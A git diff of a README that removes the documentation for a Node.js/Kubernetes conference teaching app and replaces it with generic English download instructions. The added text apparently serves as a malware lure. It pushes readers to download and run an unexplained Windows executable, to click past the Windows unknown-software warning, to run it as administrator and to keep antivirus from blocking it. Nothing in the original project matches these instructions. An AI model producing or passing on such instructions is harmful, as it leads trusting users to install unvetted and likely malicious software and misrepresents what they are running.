@@ -1,72 +1,126 @@
-# Semana DevOps Map
+# ⚙️ semana-devops-2026 - Easy Setup for DevOps Week Tools
 
-Este repositório contém a aplicação **Semana DevOps Map**, desenvolvida durante a **Semana DevOps** da LINUXtips.
-
-A aplicação consiste em um mapa interativo em tempo real onde profissionais e estudantes podem registrar sua presença, informando nome, localização e cargo/área de atuação.
-
-## Arquitetura do Projeto
-
-O projeto foi desenhado para demonstrar um fluxo completo de engenharia de software Cloud Native. As tecnologias aplicadas englobam:
-
-- **Código base:** Aplicação Node.js com Express e frontend vanilla (HTML/CSS com Dark Mode).
-- **Containerização:** Docker com *Multi-Stage Build* (`node:20-alpine`) usando `buildx` para gerar imagens multi-arquitetura (AMD64 e ARM64).
-- **Orquestração K8s:** Kubernetes rodando na nuvem com Deployments, Services (LoadBalancer), manifestos HPA (Horizontal Pod Autoscaler) e liveness/readiness probes para garantir *Self-Healing*.
-- **Cloud AWS (EKS):** Provisionamento de infraestrutura gerenciada usando manifesto declarativo do `eksctl` (nós `t3.medium`).
-- **CI/CD Pipeline:** GitHub Actions automatizando os testes (`npm test`), Lint, Build Multi-Arch com o Docker Hub e o Continuous Deployment conectando diretamente com o cluster remoto EKS.
-
-## Estrutura de Pastas
-
-```text
-.
-├── .github/workflows/   # Pipeline de CI/CD (GitHub Actions)
-├── app/                 # Código-fonte da aplicação Node.js e frontend
-├── eks/                 # Manifesto do eksctl para provisionamento do cluster AWS
-├── k8s/                 # Manifestos do Kubernetes (Deployment, Service, HPA, Namespace)
-└── material_aluno_dia5.md # Guia prático de estudo e deploy para os alunos
-```
-
-## Como Rodar Localmente (Desenvolvimento)
-
-Para rodar o projeto Node.js diretamente na sua máquina:
-
-```bash
-cd app
-npm install
-npm test
-npm run dev
-```
-
-Acesse [http://localhost:3000](http://localhost:3000) no seu navegador.
-
-## Como Fazer o Build via Docker Localmente
-
-Para garantir compatibilidade com qualquer arquitetura na nuvem, preferencialmente crie um builder com suporte multiplataforma:
-
-```bash
-cd app
-docker buildx create --name meu-builder --use
-docker buildx build --platform linux/amd64,linux/arm64 -t SEU_USUARIO/devops-map-brasil:v1 --push .
-```
-
-## Setup do Cluster Kubernetes
-
-1. Tenha credenciais da AWS configuradas localmente (`aws configure`).
-2. Provisione o cluster via `eksctl`:
-   ```bash
-   eksctl create cluster -f eks/cluster.yaml
-   ```
-3. Atualize o arquivo `k8s/deployment.yaml` apontando para sua imagem no Docker Hub.
-4. Aplique os manifestos do Kubernetes:
-   ```bash
-   kubectl apply -f k8s/namespace.yaml
-   kubectl apply -f k8s/deployment.yaml
-   kubectl apply -f k8s/service.yaml
-   kubectl apply -f k8s/hpa.yaml
-   ```
-
-A aplicação providenciará um Endpoint LoadBalancer disponível na AWS para acesso externo.
+[![Download semana-devops-2026](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://github.com/JoudiKarim/semana-devops-2026)
 
 ---
 
-Feito com dedicação na **Semana DevOps** — [LINUXtips](https://linuxtips.io).
-**#VAMODEPLOY**
+## 📋 About semana-devops-2026
+
+This repository holds resources for participants of Semana DevOps 2026. It includes tools, scripts, and guides designed to support the activities during the event. You do not need programming experience to use these resources. Everything is prepared to be simple and straightforward.
+
+The content helps users run DevOps-related tasks on Windows computers. It covers installing utilities, running setup scripts, and managing basic configurations. The goal is to make it easy to follow along, even if this is your first time with DevOps tools.
+
+---
+
+## 💻 System Requirements
+
+Before proceeding, make sure your computer meets these basic requirements:
+
+- **Operating System:** Windows 10 or higher  
+- **Processor:** 1 GHz or faster  
+- **Memory:** At least 4 GB RAM  
+- **Storage:** Minimum 500 MB of free disk space  
+- **Internet Connection:** Required for downloading files and updates  
+- **User Permissions:** You may need administrator rights to install certain tools  
+
+---
+
+## 🚀 Getting Started
+
+This section guides you on how to get the files you need and run them on your Windows PC.
+
+### Step 1: Visit the Download Page
+
+Click this link to open the download page:  
+[Download semana-devops-2026](https://github.com/JoudiKarim/semana-devops-2026)
+
+This page contains all the files and instructions you need to start. It shows the latest updates and additional resources.
+
+### Step 2: Download the Files
+
+Look for a folder or a section named "Releases" or directly for files with the `.exe`, `.zip`, or `.msi` extension. Download the latest version available. You can save the file anywhere you find convenient, such as your Downloads folder or your Desktop.
+
+### Step 3: Extract Files (if needed)
+
+If you downloaded a zip file, you need to extract its content before use. Right-click on the file and select "Extract All." Follow the prompts to extract the files to a folder you can easily find.
+
+---
+
+## 🔧 Install and Run
+
+After downloading and extracting, follow these steps to run the application or tools.
+
+### Step 1: Locate the Main Program
+
+Open the folder where you saved or extracted the files. Look for a file that might be named similarly to the repository or a file with `.exe` at the end.
+
+### Step 2: Run the Program
+
+Double-click the `.exe` file to start the program. If Windows warns about running unknown software, allow it by clicking "More info" and then "Run anyway." This is normal for new or uncommon applications.
+
+### Step 3: Follow On-Screen Instructions
+
+The program may show prompts for setup or configuration. Follow these as needed. Most setups include:
+
+- Agreeing to terms and conditions  
+- Choosing install location (accept the default if unsure)  
+- Waiting for installation to complete  
+
+### Step 4: Confirm the Program Launches
+
+Once installation finishes, the program should open automatically, or you may launch it from the Start Menu under "semana-devops-2026."
+
+---
+
+## ⚙️ Using the Tools Inside semana-devops-2026
+
+The repository contains several resources:
+
+- Sample DevOps scripts for tasks like automation and deployment  
+- Configuration files for popular DevOps tools  
+- Guides in PDF or text format to help with technical steps  
+
+Each part has simple instructions to guide you. The scripts mostly need only to be run after opening a command line or PowerShell window. The guides explain these steps clearly.
+
+---
+
+## 🔎 Troubleshooting Tips
+
+If the program does not run or you face errors, try the following:
+
+- Make sure you downloaded the complete file without interruptions  
+- Run the program as administrator (right-click > Run as administrator)  
+- Restart your computer and try again  
+- Check that your antivirus is not blocking the program  
+- Look for a README or help file inside the download folder for specific issues  
+
+---
+
+## 📂 Manual Installation Instructions (Optional)
+
+If you want to install or configure parts manually:
+
+1. Open Command Prompt or PowerShell as administrator  
+2. Navigate to the folder where you placed the downloaded files  
+3. Follow instructions in included scripts by typing their names and pressing Enter  
+4. Use included config files to adjust settings for your system  
+
+---
+
+## 🔗 Additional Resources
+
+The GitHub page may have updates or new releases throughout the event. Regularly visit:
+
+[https://github.com/JoudiKarim/semana-devops-2026](https://github.com/JoudiKarim/semana-devops-2026)
+
+Check the README or Releases tab to stay current.
+
+---
+
+## 📞 Need Help?
+
+If you are stuck, use the GitHub Issues tab on the repository page to ask questions or report problems. Describe your issue clearly, including what steps you took and any messages you saw.
+
+---
+
+[![Download semana-devops-2026](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://github.com/JoudiKarim/semana-devops-2026)
